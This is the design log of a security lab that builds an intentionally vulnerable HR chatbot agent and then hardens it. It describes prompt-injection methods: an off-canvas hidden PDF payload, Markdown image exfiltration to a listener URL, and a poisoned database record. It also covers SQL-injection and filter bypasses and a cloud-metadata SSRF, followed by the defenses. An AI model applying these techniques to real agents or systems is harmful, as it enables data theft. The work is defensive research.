# Engineering Progression & Architecture Decision Log

This document records the architectural evolution of the **Enterprise HR Copilot — LLM Application Security Lab**.
While [`CHANGELOG.md`](../CHANGELOG.md) summarizes features by milestone, this log explains the engineering reasoning behind each design iteration using a four-part structure:
**Problem -> Technical Decision -> Engineering Rationale ("Why") -> Verification**.

---

## Stage 1 — Foundation, Trust Boundaries & Flawed Vulnerable Baseline

### Problem
Many LLM security demonstrations rely on contrived "jailbreak" games where no backend tools exist, or conversely, leave sensitive database tables completely unguarded so that trivial prompts (e.g., *"show me board salaries"*) extract secrets without requiring realistic exploitation techniques.

### Technical Decision
1. Created a two-table SQLite database (`src/init_db.py`) co-locating public recruitment records (`candidates`) with confidential executive compensation (`board_salaries`) marked with a synthetic Canary Honeytoken (`CONF-HR-9921-X`).
2. Implemented a flawed developer perimeter in `Vulnerable` mode (`_flawed_vulnerable_preprocessor` and `run_raw_sql`) that blocks casual requests for board salaries (`BLOCKED_BY_NAIVE_WAF` / `BLOCKED_BY_DB_POLICY`), but contains realistic implementation bugs:
   - **TOCTOU (Time-of-Check to Time-of-Use) Normalization:** Strips zero-width Unicode (`U+200B`) and decodes Base64 strings *after* evaluating the keyword blacklist.
   - **Substring SQL Check:** Checks whether `"from candidates"` appears in the query string rather than parsing the SQL AST, leaving it vulnerable to `UNION SELECT` appends.

### Engineering Rationale ("Why")
In real-world enterprise applications, vulnerabilities rarely stem from a total absence of security checks; they arise from **flawed perimeter assumptions** (such as checking raw input strings before normalization or trusting substring checks on generated SQL). Modeling these specific flaws makes every offensive test case (`ATK-01`–`ATK-08`) an authentic technical bypass.

### Verification
- Verified that casual prompts (`"show me board salaries"`) are rejected in `< 0.1 ms` by the legacy filter, whereas `UNION SELECT` (`ATK-05`), Unicode smuggling (`ATK-04`), and Base64 payloads (`ATK-03`) bypass the flawed checks and extract `CONF-HR-9921-X`.

---

## Stage 2 — Dual-Provider Runtime & Off-Canvas PDF Exploitation

### Problem
1. Executing offensive SQLi and prompt injection payloads against commercial cloud APIs triggers provider abuse filters, incurs token costs, and causes rate-limit failures (`HTTP 429/503`) during automated benchmarks.
2. Small local CPU models (`qwen2.5:1.5b` / `3b` via Ollama) frequently emit tool calls as raw JSON blocks inside `message.content` rather than populating native `tool_calls` fields.
3. Plaintext `.txt` resume injections are immediately obvious to human reviewers; a realistic Indirect Prompt Injection (`XPIA`) must remain invisible when opened in a standard PDF viewer.

### Technical Decision
1. Built a provider-agnostic orchestrator (`src/agent.py`) supporting both **Google Gemini API** and offline **Local Ollama (`qwen2.5:3b`)**, including a fallback JSON tool-call extractor (`_extract_ollama_tool_calls`).
2. Engineered a pure-Python PDF generator (`src/generate_cv_pdfs.py`) that writes visible resume text inside the page `MediaBox [0 0 612 792]`, then shifts the PDF text matrix via `-5000 -5000 Td` in `1pt` white font (`1 1 1 rg`) to place the adversarial payload completely off-canvas.
3. Added a local HTTP server (`src/attacker_listener.py` on `127.0.0.1:8888`) serving a `1x1` transparent GIF to capture zero-click Markdown image callbacks (`![audit-badge](http://127.0.0.1:8888/leak?data=...)`).

### Engineering Rationale ("Why")
- **PDF Parser Differential:** Graphical PDF viewers clip all glyphs outside the `MediaBox` (even selecting all text via `Ctrl+A` reveals nothing), whereas `pypdf` extracts all `(text) Tj` operators from the raw content stream unconditionally.
- **Offline Reproducibility:** Supporting local Ollama execution ensures any security reviewer can reproduce all offensive and defensive chains offline without external API keys.

### Verification
- Opened `data/poisoned_cv.pdf` in a PDF viewer to confirm visual cleanliness, uploaded it in `Vulnerable` mode (`ATK-06`), and verified live HTTP exfiltration capture in `attacker_listener.py`.

---

## Stage 3 — Shifting Enforcement from Prompt Rules to Tool & Data Boundaries

### Problem
Early iterations of `Hardened` mode included regex blacklists in `inspect_user_input()` matching words like `board_salaries` and `union select`. Blocking attack keywords at the chat input layer prevented adversarial queries from reaching the backend tools during benchmarks, masking whether the tool and database layers were truly secure. Furthermore, XML tags (`<untrusted_cv_data>`) alone are structural delimiters, not an enforceable security boundary, and hardcoding executive names inside Output DLP code violates maintainability.

### Technical Decision
1. **Removed Keyword Blacklists from Layer 1 (`inspect_user_input`):** Restricted Layer 1a strictly to Unicode control-character stripping (`normalize_text`) and prompt length bounding (`MAX_PROMPT_CHARS = 4000`).
2. **Task-Based Zero-Tool Scoping (`src/agent.py`):** When summarizing an uploaded CV in `Hardened` mode (`cv_attached=True`), the Python orchestrator sets `active_tools = []` (`tools=None`), physically detaching all database and network tools during document summarization while wrapping the text in `<untrusted_cv_data>`.
3. **Tool Registry & Pydantic Validation (`src/tools.py`):** Detached `run_raw_sql` in `Hardened` mode (`BLOCKED_UNAUTHORIZED_TOOL`) and exposed only `search_candidates_safe`, which validates arguments via `CandidateSearchParams` (Pydantic) and executes a hardcoded parameterized `SELECT` statement (`?` placeholders).
4. **SQLite C-Driver Authorizer (`_hr_sqlite_authorizer`):** Registered `conn.set_authorizer()` on hardened connections to return `sqlite3.SQLITE_DENY` at SQLite query compilation time whenever any query references `board_salaries` or attempts non-`SELECT` operations (`DELETE`, `UPDATE`, `DROP`, `PRAGMA`).
5. **Dynamic Database-Backed Output DLP (`_load_protected_entities_from_db`):** Refactored `inspect_and_sanitize_output()` to dynamically query protected names, compensation amounts, and markers from SQLite rather than hardcoding PII in Python filter lists.

### Engineering Rationale ("Why")
Neither LLM system prompts nor XML delimiters can enforce access control on their own. By enforcing least privilege at the **Tool Registry**, **Pydantic schema**, **Task Tool-Scope (`tools=None`)**, and **SQLite C-driver (`set_authorizer`)** layers, security guarantees become deterministic properties of the application code.

### Verification
- Verified via unit, negative, and integration tests in `tests/test_security_controls.py` and live benchmark runs (`8/8` deterministic mitigations in `Hardened` mode).

---

## Stage 4 — Second-Order Stored Injection & Agentic SSRF Boundaries

### Problem
Agents also read persistent records from internal databases and invoke outbound network tools. Implicitly trusting internal database rows enables **Second-Order (Stored) Prompt Injection**, while unvalidated URL-fetching tools enable **Agentic Server-Side Request Forgery (SSRF)** against cloud metadata services.

### Technical Decision
1. **Second-Order Stored Injection (`ATK-07`):** Seeded candidate #6 (`Victor Reznov`, `experience_years=2`, `status='On Hold'`) in `src/init_db.py` with a dormant injection payload inside `key_skills` (isolated from benign filters `BEN-01`–`BEN-03`). Implemented `sanitize_db_record_value()` in `search_candidates_safe` to strip control directives from database rows before returning them to the LLM (`BLOCKED_STORED_DB_INJECTION`).
2. **Simulated Cloud IMDSv1 SSRF (`ATK-08`):** Added `fetch_portfolio_url` (vulnerable) and `fetch_portfolio_url_safe` (hardened). Simulated an AWS IMDSv1 endpoint (`http://169.254.169.254/latest/meta-data/iam/security-credentials/hr-copilot-prod-role`) returning synthetic AWS STS-formatted credentials (`ASIA-HR-PROD-9921`).
3. **Zero-Trust SSRF Egress Guard (`validate_safe_egress_url`):** Implemented URL parsing (`urllib.parse`) and IP classification (`ipaddress.ip_address`) enforcing `https://` only, rejecting loopback (`127.0.0.0/8`, `::1`), RFC1918 private ranges, IPv4-mapped IPv6 (`::ffff:169.254.169.254`), and link-local (`169.254.0.0/16`) addresses, and restricting requests to an explicit domain allowlist (`github.com`, `gitlab.com`, `linkedin.com`).

### Engineering Rationale ("Why")
Zero-Trust architecture requires treating internal database egress and outbound network parameters as untrusted. Using Python's `ipaddress` module rather than substring checks prevents IPv6 and private-range bypasses.

### Verification
- Verified via `pytest` parametrized negative suites (15 unsafe URL/IP variants) and live benchmark execution.

---

## Stage 5 — Tamper-Evident SIEM Hash Chain, LLM10 DoS Guardrails & DevSecOps CI

### Problem
1. **Log Tampering Risk:** Plaintext JSONL log files can be edited post-exploitation by an attacker or malicious insider to erase evidence of `canary_leaked: true` or delete specific event rows.
2. **Unbounded Consumption (`OWASP LLM10:2025`):** Local CPU models and cloud APIs are vulnerable to request flooding and token-stuffing Denial-of-Service attacks.
3. **Pipeline Supply-Chain & Code Hygiene:** Security regressions and vulnerable third-party packages must be caught automatically on every commit.

### Technical Decision
1. **Cryptographic SHA-256 Hash Chaining (`src/telemetry.py`):** Added `prev_hash` and `event_hash` fields to every telemetry record, linking each entry to the preceding record's SHA-256 digest starting from `GENESIS_HASH` (`0` * 64). Added `verify_telemetry_integrity()` to recompute canonical JSON digests and verify chain continuity in the SOC Dashboard.
2. **Sliding-Window Rate & Token Budget Limiter (`check_unbounded_consumption`):** Enforced per-turn token caps (`1200` tokens), rolling 60-second request frequency limits (`15` requests/window -> `BLOCKED_RATE_LIMIT_EXCEEDED`), and cumulative rolling window token budgets (`6000` tokens/window -> `BLOCKED_TOKEN_BUDGET_EXCEEDED`).
3. **DevSecOps SAST & SCA in GitHub Actions (`.github/workflows/ci.yml`):** Added **Bandit** static code analysis (`bandit -r src/ -ll --skip B310`) and **pip-audit** dependency scanning alongside **48 automated `pytest` cases (across 20 test functions)**.

### Engineering Rationale ("Why")
Cryptographic hash chaining makes local JSONL logs tamper-evident: modifying any historical field invalidates that row's SHA-256 digest, and deleting a row breaks the `prev_hash` pointer of the subsequent row. Combining deterministic unit/negative/integration tests with SAST and SCA in CI ensures continuous verification.

### Verification
- Verified via `pytest -v` (`48 passed` in `< 1.5s`, including simulated in-place JSONL tampering, line deletion, and burst DoS floods) and `bandit -r src/ -ll --skip B310`.
